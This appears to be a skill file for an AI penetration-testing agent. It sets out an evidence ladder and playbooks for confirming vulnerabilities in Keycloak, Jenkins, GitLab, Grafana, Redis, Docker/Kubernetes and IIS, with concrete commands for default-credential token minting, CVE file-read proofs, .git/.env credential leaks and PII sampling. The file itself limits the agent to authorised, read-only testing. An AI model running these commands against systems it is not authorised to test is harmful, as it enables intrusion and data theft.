---
name: deep-verification
description: Turn a discovery into a CONFIRMED, severity-justified finding. Use whenever a scan/crawl surfaces an exposed admin console, a version-matched product, an exposed secret, a default-cred-able service, a datastore, or an auth-bypass/injection candidate — i.e. any time you are tempted to report "found X" without proving it. Per-service playbooks (Keycloak, Jenkins, GitLab, Grafana, Redis/Mongo/ES, Docker/K8s, IIS/ASP.NET) + the evidence ladder + safe-verification discipline.
---

# Deep verification — don't just find it, prove it

A reachable surface is **rung 0 (INFO)**, not a finding. A real analyst climbs an
evidence ladder for hours until they confirm impact or genuinely exhaust every avenue.
**You are obliged to report verified findings to the org that authorised this** — so do
not stop at "found but unverified."

## The evidence ladder (severity is EARNED, not claimed)
| Rung | Meaning | Evidence required | Severity |
|---|---|---|---|
| 0 | reachable | endpoint/banner/version responds | INFO |
| 1 | version-matches-CVE | exact version pinned + a CVE whose range includes it | LOW |
| 2 | precondition reachable | the vulnerable code path responds (low-priv acct / endpoint) | MEDIUM |
| 3 | **verified exploit** | reproducible PoC — exact request+response, boundary broken | **HIGH** |
| 4 | **impact** | dumped data / minted token / RCE / pivot | **CRITICAL** |

Report the **highest rung you have evidence for**. A matched CVE's CVSS is only the
*ceiling* (rung 1) until you prove the preconditions. No PoC → it's a candidate, not a finding.

## The loop (every lead)
1. **Fingerprint** the exact product + version (`whatweb -a 3`, `.well-known`, asset hashes, banners).
2. **Correlate CVEs**: `searchsploit <product> <version>`, `nmap -sV --script vulners`, and pull the
   CVE **description + PoC** into context (this single step takes exploitation from ~7% → ~87%).
3. **Verify** (safe first): default creds, documented bypass, `nuclei -id <CVE>` template, a read-only
   PoC (fetch `/etc/passwd`), or an out-of-band callback. Demand observable evidence.
4. **Escalate / chain**: a verified vuln spawns new leads (admin token → enumerate → mint tokens → pivot).
   This is what produces hours of legitimate work.
5. **Record**: `syber_publish_finding` with the exact request/response evidence and the rung you proved.
   On a failed hypothesis, reflect ("admin/admin rejected → try CVE-2024-3656 low-priv path") and try the next.
   Only conclude a lead when VERIFIED or genuinely EXHAUSTED (every hypothesis tried + logged).

Use `syber_leads_status` to see open leads and `syber_verify_lead <id>` to get the hypotheses + CVE intel.

## Per-service playbooks (read-only / OAST proofs; nothing destructive)

### Keycloak (the canonical "exposed admin console" case)
```
curl -s {base}/realms/master/.well-known/openid-configuration | jq        # version + endpoints
curl -s {base}/admin/master/console/ | grep -Eio 'resourceVersion|[0-9]+\.[0-9]+\.[0-9]+'
# THE exploitability check — default-cred admin token:
curl -s -X POST {base}/realms/master/protocol/openid-connect/token \
  -d grant_type=password -d client_id=admin-cli -d username=admin -d password=admin   # access_token = CRITICAL
nuclei -u {base} -tags keycloak
```
CVE-2024-3656 (<24.0.5): any low-priv token can hit `POST /admin/realms/{r}/testLDAPConnection`
with `connectionUrl: ldap://<your-oast-host>` → inbound callback = confirmed. Exposure alone = LOW;
admin token / CVE confirmed = CRITICAL.

### Jenkins
`curl -sI :8080 | grep X-Jenkins` (exact version). CVE-2024-23897 (≤2.441): `jenkins-cli ... -http connect-node "@/etc/passwd"` echoes file lines = unauth read → `secret.key`/`credentials.xml` → RCE.

### GitLab / Grafana
GitLab `/api/v4/version` → CVE-2023-2825 path traversal returns `root:x:0:0:`. Grafana `/api/health` →
CVE-2021-43798 `--path-as-is .../public/plugins/alertlist/../../../../etc/passwd` returns the file.

### Redis / Mongo / Elasticsearch
`redis-cli -h H ping` → PONG without AUTH = unauth (CRITICAL). `mongosh "mongodb://H:27017" --eval 'db.adminCommand({listDatabases:1})'`. `curl H:9200/_cat/indices` returning real indices = unauth data read.

### Docker / Kubernetes
`curl H:2375/containers/json` (unauth daemon = host RCE), `curl -sk H:10250/pods` (anonymous kubelet).

### `.git` / `.env`
`curl -w '%{http_code}' /.git/HEAD` → 200 + `ref: refs/` then `git-dumper` = source disclosure.
`curl /.env | grep -iE 'KEY|SECRET|PASSWORD'` = credential leak.

### IIS 10 / ASP.NET (Windows stack)
Headers (`Server`, `X-AspNet-Version`) → CVE correlation (e.g. CVE-2020-0688). `curl /web.config | grep machineKey`; ViewState deser confirmed only via a leaked/default machineKey + an out-of-band callback payload.

### Unauthenticated data / API endpoint, exposed Swagger (the "is there real data?" case)
This is the rung-2→4 jump operators most often skip: an endpoint returns `200` / `true` / a JSON object and gets reported as CRITICAL without anyone confirming **real data**.
- A leaked **Swagger/OpenAPI spec is the map, not the impact**. Read it, then walk the *data-returning* routes — `GetUserDetails`, `GetBankDetails`, `GetPersonalDetails`, `GetDigilockerDetails`, any `list`/`search`/`export` route, or sequential-id object routes.
- For each, call `mcp__syber-tools__syber_verify_data_exposure <url>` (or `syber_http_request` then inspect): it downloads a sample and classifies it for **real PII** (email/phone/PAN/Aadhaar/SSN/card+Luhn/IFSC), **secrets/tokens** (JWT/AWS/private-key/credential fields), and **structured records**, and saves a **redacted** evidence artefact.
- **Rung discipline:** a confirmed sensitive sample = rung 4 / CRITICAL. Structured records but no classified PII = rung 3 / HIGH (unauth data exposure). `MonitorDB → true`, an empty array, or an HTML page = rung 2 (reachable), **not** impact — try a real data route or stop inflating.
- Exfiltrate **only the one sample needed to prove access** (the tool caps + redacts automatically); never bulk-dump.

## Safe-verification discipline
- **Do:** read-only file-disclosure proofs, OAST/DNS callbacks (no shell), version+behaviour
  correlation, single marker-named artifacts (cleaned up), curated low-rate default-cred checks.
- **Don't (even when authorised, on prod):** real RCE shells, Redis `CONFIG SET dir`+webshell,
  `MODULE LOAD`, Docker privileged container, kubelet exec, DoS scripts, lockout-inducing spraying,
  destructive verb tampering, exfil beyond the one record needed to prove access.
